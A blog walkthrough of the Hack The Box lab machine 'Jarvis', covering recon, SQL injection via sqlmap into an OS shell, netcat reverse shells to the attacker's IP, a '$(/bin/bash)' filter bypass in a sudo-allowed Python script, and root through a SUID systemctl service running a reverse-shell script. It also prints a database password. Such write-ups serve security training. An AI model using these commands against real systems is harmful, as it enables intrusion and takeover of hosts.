---
layout: post
title: "HTB-Jarvis"
categories: HTB-Walkthrough
---

![jarvis1](/assets/img/jarvis/jarvis1.png)

nmap first:


<h3>Nmap</h3>

```
nmap -sV -Pn --min-rate 10000 -p- 10.10.10.143 |tee -a j2.txt
```

```

Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 10:26 EDT
Warning: 10.10.10.143 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.143
Host is up (0.13s latency).
Not shown: 48259 closed ports, 17273 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```




<h3>Gobuster</h3>

```
gobuster dir -u http://10.10.10.143/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```

/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)

```

```
gobuster dir -u http://10.10.10.143/phpmyadmin/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```

/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/ChangeLog (Status: 200)
/LICENSE (Status: 200)
/README (Status: 200)
/doc (Status: 301)
/examples (Status: 301)
/favicon.ico (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/libraries (Status: 301)
/locale (Status: 301)
/phpinfo.php (Status: 200)
/robots.txt (Status: 200)
/setup (Status: 301)
/sql (Status: 301)
/templates (Status: 301)
/themes (Status: 301)
/tmp (Status: 301)
/vendor (Status: 301)

```


<hr width="250" size="6">




A look at the website whilst `gobuster` was doing its thing!

![stark1](/assets/img/jarvis/jarvis-stark1.png)


Add `supersecurehotel.htb` to /etc/hosts


Browsing the site, the urls for the rooms look like we can test the `cod` variable for sqli.

adding a ' to the url doesn't produce an error, and may mean further testing is necessary.

![sqltest](/assets/img/jarvis/jarvis-sqltest-response.png)

If we're lazy, a quick and easy shell can be gained with sqlmap.

```
sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell
```


```

[12:04:55] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbrdae.php
[12:04:55] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell> 

```

a netcat reverse-shell works:

```
nc -nv 10.10.14.7 6969 -e /bin/bash
```

make it better with:

```
python -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z  (to background the process)
stty raw -echo 
fg

```




##############



<h3>Privilege Escalation</h3>


`sudo -l` gets:
```

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

```

check out the script...

```python

#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()

```

Notice that the ping function will execute:
```
os.system('ping ' + command)
```
but we have to be careful what characters we use, some are 'forbidden'!!!

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

10.10.14.7 $(/bin/bash)
```

this gets us a restricted shell for `pepper`.

Another netcat reverse-shell gets us a better one!

```
nc -nv 10.10.14.7 6969 -e /bin/bash
```

then

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Happy!

Lets get pepper's user flag.

```

pepper@jarvis:/var/www/Admin-Utilities$ cat /home/pepper/user.txt
cat /home/pepper/user.txt
2axxxxxxxxxxxxxxxxxxxxxxxxxxx4f
pepper@jarvis:/var/www/Admin-Utilities$ 

```


<h3>Privesc to Root</h3>


```

pepper@jarvis:/var/www/html$ cat connection.php
cat connection.php
<?php
$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
?>
pepper@jarvis:/var/www/html$

```

Any suid binaries to exploit?
```
find / -perm -u=s -type f 2>/dev/null

/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

<h4>Exploit Systemctl Suid</h4>

First make evil.sh, a reverse shell to 6868...copied to the target (pepper's homedir)

```
#!/bin/bash

nc -nv 10.10.14.7 6868 -e /bin/bash
```
Set the netcat listener:
```
nc -nlvp 6868
```



<h4>Create systemctl service that calls evil.sh</h4>


```

pepper@jarvis:~$ P=boo.service
P=boo.service

pepper@jarvis:~$ echo '[Service]
echo '[Service]
> Type=oneshot
Type=oneshot
> ExecStart=/bin/bash -c "/home/pepper/evil.sh"
ExecStart=/bin/bash -c "/home/pepper/evil.sh"
> [Install]
[Install]
> WantedBy=multi-user.target' > $P
WantedBy=multi-user.target' > $P

pepper@jarvis:~$ chmod +s boo.service
chmod +s boo.service

pepper@jarvis:~$ systemctl link /home/pepper/boo.service
systemctl link /home/pepper/boo.service

pepper@jarvis:~$ systemctl enable /home/pepper/boo.service
systemctl enable /home/pepper/boo.service

pepper@jarvis:~$ systemctl start boo.service
systemctl start boo.service

```



Catch the shell on 6868:

```

listening on [any] 6868 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.143] 34990
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
d4xxxxxxxxxxxxxxxxxxxxxxxxxxxx71

```

:)



